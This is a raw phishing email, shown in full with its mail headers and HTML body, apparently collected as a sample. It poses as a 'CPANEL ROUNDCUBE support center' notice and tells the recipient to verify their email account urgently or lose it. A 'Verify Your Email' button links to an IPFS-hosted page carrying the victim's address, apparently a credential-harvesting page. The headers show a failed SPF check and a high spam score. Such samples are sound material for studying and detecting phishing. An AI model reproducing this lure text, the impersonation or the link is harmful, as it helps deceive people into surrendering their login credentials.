@@ -1,0 +1,267 @@
+Return-Path: info@cpanel.de
+Delivered-To: jose@monkey.org
+X-FDA: 83218582524.03.7B37C9E
+Received: from osplsmtpa02-01.prod.phx3.secureserver.net (osplsmtpa02-01.prod.phx3.secureserver.net [97.74.135.9])
+	by imf04.b.hostedemail.com (Postfix) with ESMTP id F2850160003
+	for <jose@monkey.org>; Fri, 14 Mar 2025 02:32:20 +0000 (UTC)
+Authentication-Results: imf04.b.hostedemail.com;
+	dkim=none;
+	spf=fail (imf04.b.hostedemail.com: domain of info@cpanel.de does not designate 97.74.135.9 as permitted sender) smtp.mailfrom=info@cpanel.de;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1741919541;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=fd8TEgEtVWTUwLyKb2KlVcW4EUWYGjvr+6HubBAB8Oc=;
+	b=BKe++JeitrlWWRnjr1qqTXLSsS32LtSzX8dVimv6tiLcNV4ST+WMhiQMWkFQqTKnLAGXAd
+	FK2tvTmvucCTdf1a4QzQSK+FDBCiudQAlEiS8AqGcVAKFX+59gqjf0enEo7xdkzj+yEAJU
+	bV6zSMXZ0qOoIXCq1zA8l/pmDOZTMg8=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1741919541; a=rsa-sha256;
+	cv=none;
+	b=bCe4DByVsQ8NLpk8z52fhm+YoVN15duc5g4iDFsxHZCIm3lfv+iXoAw2+S4fZcR1FzD+qj
+	+Ja3kkuXmxSVEEcq/80y82d3BhJeJ6wXKaFATz6qJciB6bQu2PWqwjoSzNujWYRPrF12jz
+	bYkYqUpbYJYN2uzYHrah0FhO+oTkw/U=
+ARC-Authentication-Results: i=1;
+	imf04.b.hostedemail.com;
+	dkim=none;
+	spf=fail (imf04.b.hostedemail.com: domain of info@cpanel.de does not designate 97.74.135.9 as permitted sender) smtp.mailfrom=info@cpanel.de;
+	dmarc=none
+Received: from cpanel.de ([149.56.205.74])
+	by :SMTPAUTH: with ESMTPSA
+	id suq1t8hRfae70suqLtO7i4; Fri, 14 Mar 2025 02:32:14 +0000
+X-SECURESERVER-ACCT: ayub@svi-solutions.com
+From: "webmailsupport"< info@cpanel.de>
+To: jose@monkey.org
+Subject: jose@monkey.org  Urgent Notification
+Date: 13 Mar 2025 19:32:11 -0700
+Message-ID: <20250313193120.B762FFBD982C7CEA@cpanel.de>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-CMAE-Envelope: MS4xfGkgNkV1CGXKHBDrko1lVRMGIJH3hTIS2qxGEwSe+ytmAfNFofQW1am/sBjtqCXhrQSj4A1irmCRqD7Hps1bQjQDVHxGEWxgWiYo24iN06djyR7rg0yq
+ i9ZxzaVuKlv0Q2NicxAejx0tLXTw8A1R7mcjT49/6ALHr0JScEr0mRO2
+X-Rspamd-Queue-Id: F2850160003
+X-Rspam-User: 
+X-Spam-Status: Yes, score=22.30
+X-Stat-Signature: rqp9h5gppujtc9xi8pzkm4413gsrpeq8
+X-Rspamd-Server: rspam02
+X-CMAE-Analysis: v=2.4 cv=WLx5XGsR c=1 sm=1 tr=0 ts=67d39535
+	a=+fikf30+EngZdGW/z3Ov5A==:117 a=jtj1hP3Uiq05qCTIjfJhbg==:17
+	a=T-PJXEmqAAAA:8 a=sbqGhzo7vaogXqIfg0wwtJZuoPc=:19 a=8nJEP1OIZ-IA:10
+	a=dmxX3Yl7JyAA:10 a=Vs1iUdzkB0EA:10 a=nxfE0ZdbAAAA:20
+	a=_HX_cm2MBTZL41mQEMMA:9 a=hTtCAgzGjHidgWNT:21 a=_W_S_7VecoQA:10
+	a=wPNLvfGTeEIA:10 a=s4XyaPpffwUA:10 a=TljsO18HQW8A:10 a=RVmHIydaz68A:10
+	a=TLMVSm3AIi2ufbynrBM0:22
+X-HE-Tag: 1741919540-722695
+X-HE-Meta: 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
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 93
+
+<HTML><HEAD><TITLE></TITLE>
+<META content=3D"text/html; charset=3Diso-8859-1" http-equiv=3DContent-Type=
+>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17416"></HEAD>
+<body>
+<P>
+<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: &quot=
+;Times New Roman&quot;; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLL=
+APSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: norma=
+l; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorati=
+on-thickness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial" cellspacing=3D"0" cellpadding=3D"0" width=
+=3D"650" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: &#46027;=
+&#50880;, dotum, Verdana, sans-serif; COLOR: rgb(51,51,51)">
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" height=3D"38" width=3D=
+"80"><FONT style=3D"BOX-SIZING: border-box" color=3D#cc0000 size=3D4><B sty=
+le=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><FONT style=3D"BOX-SIZIN=
+G: border-box; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border-b=
+ox; VERTICAL-ALIGN: inherit">WEBMAIL&nbsp;</FONT></FONT></B></FONT></TD>
+<td style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" height=3D"38" width=3D=
+"516"><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">&nbsp;</B></=
+TD>
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMILY: Tahoma; =
+COLOR: rgb(61,59,59); PADDING-BOTTOM: 0px; TEXT-ALIGN: right; PADDING-TOP: =
+15px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" width=3D"72"><B s=
+tyle=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><FONT style=3D"BOX-SIZ=
+ING: border-box; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border=
+-box; VERTICAL-ALIGN: inherit">03/14/2025 7:39:54 a.m.</FONT></FONT></B></T=
+D></TR>
+<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: &#46027;=
+&#50880;, dotum, Verdana, sans-serif; COLOR: rgb(51,51,51)">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 0px; P=
+ADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" bgcolo=
+r=3D"#ed2000" height=3D"4" colspan=3D"3"><B style=3D"BOX-SIZING: border-box=
+; FONT-WEIGHT: bolder">&nbsp;</B></TD></TR></TBODY></TABLE></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: &#46027;&=
+#50880;, Dotum, Verdana, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
+; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM=
+: 0px; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT=
+: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-=
+RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial"><BR style=3D"BOX-S=
+IZING: border-box"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: i=
+nherit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><ST=
+RONG>Hello accounts@</STRONG><SPAN id=3Dv1v1yiv0752291677yui_3_16_0_ym19_1_=
+1498946853036_370242 style=3D"FONT-SIZE: 10pt; FONT-FAMILY: Arial">
+<SPAN id=3Dv1v1yiv0752291677yui_3_16_0_ym19_1_1498946853036_370243 style=3D=
+"COLOR: rgb(255,0,0)"><SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Source =
+Sans Pro",Calibri,Candara,Arial,sans-serif; WHITE-SPACE: normal; WORD-SPACI=
+NG: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(51=
+,51,51); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPL=
+AY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(245,24=
+5,245); TEXT-INDENT: 0px'>
+<FONT style=3D"BACKGROUND-COLOR: #ffffff" color=3D#000000 face=3DArial>jose=
+@monkey.org</FONT></SPAN></SPAN></SPAN><STRONG>.&nbsp;<BR style=3D"BOX-SIZI=
+NG: border-box"></STRONG></FONT></FONT></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: &#46027;&=
+#50880;, Dotum, Verdana, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
+; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM=
+: 0px; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT=
+: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-=
+RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-vari=
+ant-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial"><B style=3D"BOX-SI=
+ZING: border-box; FONT-WEIGHT: bolder"><FONT style=3D"BOX-SIZING: border-bo=
+x; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL=
+-ALIGN: inherit"><BR style=3D"BOX-SIZING: border-box">This is&nbsp;CPANEL&n=
+bsp;ROUNDCUBE support center,</FONT></FONT></B></P>
+<P><SPAN><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><F=
+ONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><STRONG>We ha=
+ve received many report messages requesting&nbsp;for tightening of our&nbsp=
+;email&nbsp;security&nbsp;against phishing we want to verify your </STRONG>=
+<SPAN id=3Dv1v1yiv0752291677yui_3_16_0_ym19_1_1498946853036_370242 style=3D=
+"FONT-SIZE: 10pt; FONT-FAMILY: Arial"><SPAN id=3Dv1v1yiv0752291677yui_3_16_=
+0_ym19_1_1498946853036_370243 style=3D"COLOR: rgb(255,0,0)">
+<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Source Sans Pro",Calibri,Cand=
+ara,Arial,sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: n=
+ormal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important;=
+ LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(245,245,245); TEXT-INDENT: 0=
+px'><FONT style=3D"BACKGROUND-COLOR: #ffffff" color=3D#000000 face=3DArial>=
+jose@monkey.org</FONT></SPAN></SPAN></SPAN></FONT></FONT>
+<SPAN>&nbsp;</SPAN>&nbsp;</SPAN>
+<B style=3D'BOX-SIZING: border-box; FONT-SIZE: medium; FONT-FAMILY: "Times =
+New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; F=
+ONT-WEIGHT: bolder; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left=
+; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,=
+255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-ca=
+ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
+ial; text-decoration-style: initial;=20
+text-decoration-color: initial'><SPAN style=3D"BOX-SIZING: border-box; FONT=
+-SIZE: 12px; FONT-FAMILY: &#46027;&#50880;, Dotum, Verdana, sans-serif"><FO=
+NT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><FONT style=3D=
+"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><SPAN>&nbsp;</SPAN>&nbsp;=
+email account to upgrade your security.</FONT></FONT></SPAN></B>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto=
+, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
+ FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; T=
+EXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-=
+SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font=
+-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
+width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial"></SPAN>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGH=
+T: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS=
+: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial"></SPAN></P>
+<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: medium; FONT-FAMILY: "Time=
+s New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
+ FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: left;=
+ ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,2=
+55,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-cap=
+s: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initi=
+al; text-decoration-style: initial;=20
+text-decoration-color: initial'><B style=3D"BOX-SIZING: border-box; FONT-WE=
+IGHT: bolder"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-=
+FAMILY: &#46027;&#50880;, Dotum, Verdana, sans-serif"><FONT style=3D"BOX-SI=
+ZING: border-box; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: borde=
+r-box; VERTICAL-ALIGN: inherit">Our policy is to end phishing immediately,&=
+nbsp;</FONT></FONT></SPAN>
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: &#4602=
+7;&#50880;, Dotum, Verdana, sans-serif"><FONT style=3D"BOX-SIZING: border-b=
+ox; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border-box; VERTICA=
+L-ALIGN: inherit">use link below to verify your email immediately to avoid =
+deactivation..</FONT></FONT></SPAN></B>
+<DIV style=3D"BOX-SIZING: border-box">
+<DIV style=3D"BOX-SIZING: border-box"><B style=3D"BOX-SIZING: border-box; F=
+ONT-WEIGHT: bolder"><BR style=3D"BOX-SIZING: border-box">
+&nbsp;<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; BORDER-TOP=
+: rgb(0,120,215) 1px solid; HEIGHT: 37px; BORDER-RIGHT: rgb(0,120,215) 1px =
+solid; WIDTH: 206px; BORDER-BOTTOM: rgb(0,120,215) 1px solid; COLOR: white;=
+ PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 10px; MARGIN: 0px; BO=
+RDER-LEFT: rgb(0,120,215) 1px solid; PADDING-RIGHT: 10px; BACKGROUND-COLOR:=
+ rgb(255,0,0)" href=3D"https://ipfs.io/ipfs/QmazurKN8hNRKwtLTkMMRqVtYjYAMVj=
+fBqEHUMU4swJ533/webo3.html#jose@monkey.org"=20
+rel=3Dnoreferrer target=3D_blank><SPAN>&nbsp;</SPAN>&nbsp;Verify<FONT style=
+=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZ=
+ING: border-box; VERTICAL-ALIGN: inherit"><FONT style=3D"BOX-SIZING: border=
+-box" size=3D3>&nbsp;Your&nbsp;&nbsp;Email</FONT>&nbsp;</FONT></FONT></A>&n=
+bsp;&nbsp;</B></DIV>
+<DIV style=3D"BOX-SIZING: border-box"><B style=3D"BOX-SIZING: border-box; F=
+ONT-WEIGHT: bolder"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: =
+inherit"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMIL=
+Y: &#46027;&#50880;, Dotum, Verdana, sans-serif"><FONT style=3D"BOX-SIZING:=
+ border-box; VERTICAL-ALIGN: inherit"><BR style=3D"BOX-SIZING: border-box">=
+</FONT></SPAN></FONT></B></DIV>
+<DIV style=3D"BOX-SIZING: border-box"><B style=3D"BOX-SIZING: border-box; F=
+ONT-WEIGHT: bolder"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: =
+inherit"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMIL=
+Y: &#46027;&#50880;, Dotum, Verdana, sans-serif"><FONT style=3D"BOX-SIZING:=
+ border-box; VERTICAL-ALIGN: inherit">Please perform this action urgently t=
+o avoid loosing your email account.</FONT></SPAN></FONT>
+<BR style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: &#46027;=
+&#50880;, Dotum, Verdana, sans-serif"></B>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: &#46027;&=
+#50880;, Dotum, Verdana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"></P>
+<table style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; BORDER-COLLAPSE: c=
+ollapse" cellspacing=3D"0" cellpadding=3D"0" width=3D"650" border=3D"0">
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<td style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 0px; P=
+ADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" bgcolo=
+r=3D"#666666" height=3D"4" colspan=3D"3"><B style=3D"BOX-SIZING: border-box=
+; FONT-WEIGHT: bolder">&nbsp;</B></TD></TR></TBODY></TABLE><FONT style=3D"B=
+OX-SIZING: border-box; FONT-FAMILY: &#46027;&#50880;, Dotum, Verdana, sans-=
+serif" size=3D1><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inhe=
+rit"><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit">
+<STRONG>2025 Copyright&nbsp;&nbsp;</STRONG></FONT></FONT><FONT style=3D"BOX=
+-SIZING: border-box" color=3D#ff8501 size=3D1 face=3DArial><SPAN><STRONG>&n=
+bsp;</STRONG></SPAN><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: =
+inherit"><SPAN style=3D"BOX-SIZING: border-box"><STRONG>&nbsp;</STRONG></SP=
+AN><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><STRONG>=
+&copy;</STRONG><SPAN id=3Dv1v1yiv0752291677yui_3_16_0_ym19_1_1498946853036_=
+370242 style=3D"FONT-SIZE: 10pt; FONT-FAMILY: Arial">
+<SPAN id=3Dv1v1yiv0752291677yui_3_16_0_ym19_1_1498946853036_370243 style=3D=
+"COLOR: rgb(255,0,0)"><SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Source =
+Sans Pro",Calibri,Candara,Arial,sans-serif; WHITE-SPACE: normal; WORD-SPACI=
+NG: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(51=
+,51,51); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; DISPL=
+AY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(245,24=
+5,245); TEXT-INDENT: 0px'>
+<FONT style=3D"BACKGROUND-COLOR: #ffffff" color=3D#000000 face=3DArial>jose=
+@monkey.org</FONT></SPAN></SPAN></SPAN><STRONG>&nbsp;</STRONG></FONT></FONT=
+></FONT><FONT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><FO=
+NT style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: inherit"><STRONG>&nbsp;=
+All rights reserved.</STRONG></FONT></FONT></FONT><STRONG>&nbsp;</STRONG></=
+DIV></DIV></DIV></BODY></HTML>
